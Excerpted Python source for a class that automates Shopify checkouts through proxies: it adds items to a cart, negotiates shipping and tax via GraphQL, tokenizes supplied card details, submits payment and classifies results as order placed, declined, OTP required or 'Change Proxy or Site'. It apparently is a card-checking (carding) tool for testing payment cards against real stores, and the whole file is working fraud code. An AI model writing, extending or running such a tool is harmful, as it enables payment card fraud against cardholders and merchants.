...
class CheckoutSession:
    ...
    def __init__(self, cc_info, site_url, explicit_variant_id, proxy_str):
        ...
        self.checkout_total = "0.00"
        self.merch_total = None
        self.delivery_strategy = ""
        self.payment_identifier = None
        self.confirmed_delivery_line = None
        self.last_sync_payload = None
        self.last_sync_seller_proposal = None
        self.shipping_required = True

    # ------------------------------------------------------------------
    # Cart / checkout bootstrap
    # ------------------------------------------------------------------
    async def _add_to_cart_robust(self, session: aiohttp.ClientSession):
        ...
        try:
            ...
            if c_resp.status != 200:
                ...
                c_resp = await session.post(
                    cart_url,
                    json={'items': [{'id': int(v_id), 'quantity': 1}]},
                    headers=c_headers_json,
                    proxy=self.proxy
                )
            if c_resp.status == 200:
    ...
    async def run(self, session: aiohttp.ClientSession):
        ...
        if not self.sst:
            return False, "Failed to get session token", self.gateway, self.total_price, self.currency
        ...
        if not subtotal:
            ...
            if price_match:
                subtotal = str(Decimal(price_match.group(1)).quantize(Decimal('0.01'), rounding=ROUND_HALF_UP))
            else:
                subtotal = "0.01"
        else:
        ...
        if not neg_ok:
            return False, neg_msg, self.gateway, self.total_price, self.currency

        tok_ok, token_or_err = await self._tokenize_card(session)
        if not tok_ok:
            return False, token_or_err, self.gateway, self.total_price, self.currency
        ...
        if not s_ok:
            return False, s_status, self.gateway, self.total_price, self.currency
        if s_status != "POLL":
            return True, s_status, self.gateway, self.total_price, self.currency
    ...
    # Negotiation
    # ------------------------------------------------------------------
    def _build_delivery_line(self, stage):
        """stage: 'match' (step 1, matching conditions) or 'options' (step 2/sync,
        same matching conditions but with the phone option attached)."""
        strategy_block = {
        ...
        if stage == 'options':
            strategy_block['options'] = {'phone': self.phone}
        else:
            strategy_block['options'] = {}
        ...
        return {
            ...
            'selectedDeliveryStrategy': strategy_block,
            'targetMerchandiseLines': {'lines': [{'stableId': self.stableId}]},
            'deliveryMethodTypes': ['SHIPPING'],
            'expectedTotalPrice': {'any': True},
            'destinationChanged': stage == 'match'
        }

    def _parse_proposal(self, seller_proposal, set_state=True):
        """Extract runningTotal, checkoutTotal, tax, merch total, delivery, payment."""
        ...
        if rt:
            self.running_total = str(
                Decimal(str(rt['value']['amount'])).quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
            )
        ct = seller_proposal.get('checkoutTotal')
        if ct:
            self.checkout_total = str(
                Decimal(str(ct['value']['amount'])).quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
            )
        if self.checkout_total == "0.00":
            # Fallback: derive from running + shipping + tax
            try:
                derived = (
                    Decimal(self.running_total) + self.shipping_amount + self.tax_amount
                ).quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
                self.checkout_total = str(derived)
            except Exception:
                pass
        # Keep the response's price field consistent with checkout total
        self.total_price = self.checkout_total

        tax_data = seller_proposal.get('tax', {}) or {}
        if tax_data.get('__typename') == 'FilledTaxTerms':
            tv = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount')
            if tv is not None:
                self.tax_amount = Decimal(str(tv)).quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
        ...
        if m_lines:
            ...
            if amt is None:
                ...
                if allocs:
                    for k in ('checkoutPriceAfterDiscounts', 'totalAmountAfterDiscounts',
            ...
            if amt is not None:
                self.merch_total = str(
                    Decimal(str(amt)).quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
                )
        ...
        if delivery_data.get('__typename') == 'FilledDeliveryTerms':
            ...
            if d_lines:
                ...
                available = d_lines[0].get('availableDeliveryStrategies', []) or []
                if available:
                    self.delivery_strategy = available[0].get('handle', '')
                    self.shipping_required = True
                    try:
                        ship_val = available[0].get('amount', {}).get('value', {}).get('amount', '0')
                        self.shipping_amount = Decimal(str(ship_val)).quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
                    except Exception:
                        self.shipping_amount = Decimal('0.00')
                else:
                    # No strategies available → digital-only cart
                    self.shipping_required = False
            else:
                # No delivery lines at all → digital-only cart
                self.shipping_required = False
    ...
    def _build_base_input(self, stage, subtotal):
        """Shared scaffolding for both proposals and the sync."""
        if self.shipping_required:
            delivery_block = {
                'deliveryLines': [self._build_delivery_line(stage)],
                'noDeliveryRequired': [],
            ...
            # Digital-only cart — no shipping lines at all
            delivery_block = {
                'deliveryLines': [],
                'noDeliveryRequired': [{'stableId': self.stableId}],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': False
            }
            ...
            'merchandise': {
                'merchandiseLines': [{
                    ...
                    'expectedTotalPrice': {'value': {
                        'amount': self.merch_total or subtotal,
    ...
    async def _execute_negotiations(self, session, graphql_url, subtotal):
        ...
        # ---- Step 1: shipping proposal with matching conditions ----
        step1_json = {
            'query': QUERY_PROPOSAL_SHIPPING,
            'variables': self._build_base_input('match', subtotal),
            'operationName': 'Proposal'
        }

        resp, text = await make_graphql_request_with_captcha_handling(
            session, graphql_url, params, self.headers, step1_json, self.proxy
        )
        if not resp:
            return False, f"Request failed: {text}"
        ...
        self._parse_proposal(result.get('sellerProposal', {}))

        if not self.payment_identifier:
            return False, "No valid payment method found"

        # ---- Step 2: delivery proposal (same matching conditions, phone options) ----
        step2_json = {
            'query': QUERY_PROPOSAL_DELIVERY,
            'variables': self._build_base_input('options', subtotal),
            'operationName': 'Proposal'
        }
        # Carry forward learned values
        step2_json['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(self.tax_amount)

        resp, text = await make_graphql_request_with_captcha_handling(
            session, graphql_url, params, self.headers, step2_json, self.proxy
        )
        if is_captcha_required(text):
            return False, "CAPTCHA_REQUIRED on delivery proposal"

        try:
            r2 = json.loads(text).get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            if r2:
                self.checkpoint_data = r2.get('checkpointData', self.checkpoint_data)
                new_qt = r2.get('queueToken')
                if new_qt:
                    self.queueToken = new_qt
                self._parse_proposal(r2.get('sellerProposal', {}))
        except Exception:
            pass
    ...
    async def _sync_final_proposal(self, session, graphql_url):
        # Reuse the exact step-2 input (matching conditions, phone options).
        sync_vars = self._build_base_input('options', self.merch_total or self.total_price)
        sync_vars['taxes']['proposedTotalAmount']['value']['amount'] = str(self.tax_amount)
        sync_json = {
            'query': QUERY_PROPOSAL_DELIVERY,
            'variables': sync_vars,
            'operationName': 'Proposal'
        ...
        try:
            ...
            # For digital-only carts the delivery term may be Unavailable — that's fine.
            if self.shipping_required and delivery_check.get('__typename') != 'FilledDeliveryTerms':
            ...
            self._parse_proposal(sp)

            # Stash the exact payload we just sent so submit can reuse it verbatim.
    ...
    async def _tokenize_card(self, session):
        ...
        if self.ident_sig:
            vault_headers['shopify-identification-signature'] = self.ident_sig

        try:
            resp = await session.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                json=payload, headers=vault_headers, proxy=self.proxy
            )
    ...
    async def _submit_payment(self, session, graphql_url, token, subtotal):
        if not self.last_sync_payload:
            return False, "No sync payload to submit against", ""

        sync_input = self.last_sync_payload['variables']

        # Payment amount = checkout total
        pay_amount = self.checkout_total
        if pay_amount == "0.00":
            pay_amount = self.running_total
        ...
        payment_block = {
            ...
            'billingAddress': sync_input['payment']['billingAddress']
        }

        # Submit verbatim from the sync input — only payment and queueToken refreshed.
        sub_input = dict(sync_input)
        sub_input['queueToken'] = self.queueToken or sync_input.get('queueToken') or ''
        sub_input['payment'] = payment_block
        if self.checkpoint_data:
            sub_input['checkpointData'] = self.checkpoint_data
        ...
        if not resp or is_captcha_required(text):
            return False, "CAPTCHA_REQUIRED on submit", ""
        ...
        try:
            ...
            if rtype in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                ...
                if rcpt and rcpt.get('__typename') == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", ""
                rid = rcpt.get('id') if rcpt else None
                if not rid:
                    return False, "SubmitSuccess but no receipt", ""
            ...
            if rtype == 'SubmitRejected':
                # Prefer the first specific error code we can surface
    ...
    async def _poll_receipt(self, session, graphql_url, rid):
        poll_json = {
            'query': QUERY_POLL,
            'variables': {'receiptId': rid, 'sessionToken': self.sst},
        ...
        for _ in range(4):
            resp, final_text = await make_graphql_request_with_captcha_handling(
                session, graphql_url, {'operationName': 'PollForReceipt'},
                self.headers, poll_json, self.proxy
            )

            if not resp or is_captcha_required(final_text):
                return True, "CARD_DECLINED", self.gateway, self.total_price, self.currency
            ...
            try:
                ...
                if rdata:
                    ...
                    if tname == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", self.gateway, self.total_price, self.currency
                    ...
                    if tname == 'ActionRequiredReceipt':
                        return True, "OTP_REQUIRED", self.gateway, self.total_price, self.currency
        ...
        if 'CAPTCHA_REQUIRED' in final_text:
            return True, "CARD_DECLINED", self.gateway, self.total_price, self.currency
        if 'WaitingReceipt' in final_text:
            return False, "Change Proxy or Site", self.gateway, self.total_price, self.currency
        ...
        try:
            ...
            if "shopify_payments" in str(res_json):
                return True, "ORDER_PLACED", self.gateway, self.total_price, self.currency
            if err_code:
                return True, err_code, self.gateway, self.total_price, self.currency
        ...
        if 'actionreq' in lower_txt or 'action_required' in lower_txt:
            return True, "OTP_REQUIRED", self.gateway, self.total_price, self.currency
        if 'processedreceipt' in lower_txt:
            return True, "ORDER_PLACED", self.gateway, self.total_price, self.currency
        if 'failedreceipt' in lower_txt or 'declined' in lower_txt:
            return True, code if code else "CARD_DECLINED", self.gateway, self.total_price, self.currency
